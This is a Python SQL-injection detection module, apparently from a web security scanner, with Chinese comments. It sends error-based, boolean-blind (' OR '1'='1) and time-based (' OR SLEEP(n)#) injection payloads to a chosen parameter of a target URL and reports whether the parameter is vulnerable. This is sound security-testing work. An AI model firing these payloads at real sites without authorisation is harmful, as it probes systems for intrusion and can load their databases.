# -*- coding: utf-8 -*-
"""SQL 注入检测：错误回显 + 布尔盲注 + 时间盲注"""
import time
import requests
from . import common

# 数据库报错时常见的错误关键字
SQL_ERRORS = [
    "you have an error in your sql syntax",
    "mysql_fetch",
    "warning: mysql",
    "mysql server",
    "syntax error",
    "unclosed quotation mark",
]


def _payload(params, pname, value):
    """复制一份参数，并把指定参数的值改成 value"""
    p = dict(params)
    p[pname] = value
    return p


def sqli_check(url, data=None, param=None, sleep_sec=3):
    """对指定参数做 SQL 注入检测，返回结构化结果"""
    method, base, params = common.parse_target(url, data)
    pname = common.pick_param(params, param)
    result = {
        "module": "sqli",
        "target": url,
        "param": pname,
        "vulnerable": False,
        "technique": None,
        "payload": None,
        "evidence": None,
    }
    if pname is None:
        result["error"] = "目标没有可注入的参数"
        return result
    orig = params.get(pname, "")

    # 1) 基线请求
    try:
        r0 = common.send(method, base, params)
    except requests.RequestException as e:
        result["error"] = str(e)
        return result
    result["baseline"] = {"status": r0.status_code, "length": len(r0.content)}

    # 2) 错误回显测试
    p = _payload(params, pname, orig + "'")
    try:
        r = common.send(method, base, p)
    except requests.RequestException:
        r = None
    if r is not None:
        body = r.text.lower()
        for marker in SQL_ERRORS:
            if marker in body:
                result["vulnerable"] = True
                result["technique"] = "错误回显"
                result["payload"] = orig + "'"
                result["evidence"] = marker
                result["test"] = common.display(method, base, p)
                return result

    # 3) 布尔盲注测试
    p_true = _payload(params, pname, orig + "' OR '1'='1")
    p_false = _payload(params, pname, orig + "' AND '1'='2")
    try:
        r_true = common.send(method, base, p_true)
        r_false = common.send(method, base, p_false)
    except requests.RequestException:
        result["error"] = "布尔测试请求失败"
        return result
    diff = abs(len(r_true.content) - len(r_false.content))
    result["boolean"] = {
        "true_len": len(r_true.content),
        "false_len": len(r_false.content),
        "diff": diff,
    }
    if diff > 50:
        result["vulnerable"] = True
        result["technique"] = "布尔盲注"
        result["payload"] = orig + "' OR '1'='1"
        result["test"] = common.display(method, base, p_true)
        return result

    # 4) 时间盲注测试：注入 SLEEP，比较响应时间
    # 用 # 作注释（--+ 在 URL 编码后会失效）；SLEEP 会按表行数放大，响应可能远超 sleep_sec
    p_sleep = _payload(params, pname, orig + f"' OR SLEEP({sleep_sec})#")
    timeout = sleep_sec * 5
    try:
        t0 = time.time()
        common.send(method, base, p_sleep, timeout=timeout)
        elapsed = time.time() - t0
    except requests.RequestException:
        # 请求超时（远超正常响应时间），本身也说明 SLEEP 生效了
        elapsed = timeout
    result["timing"] = {"elapsed": round(elapsed, 2), "threshold": sleep_sec - 1}
    if elapsed >= sleep_sec - 1:
        result["vulnerable"] = True
        result["technique"] = "时间盲注"
        result["payload"] = orig + f"' OR SLEEP({sleep_sec})#"
        result["test"] = common.display(method, base, p_sleep)

    return result
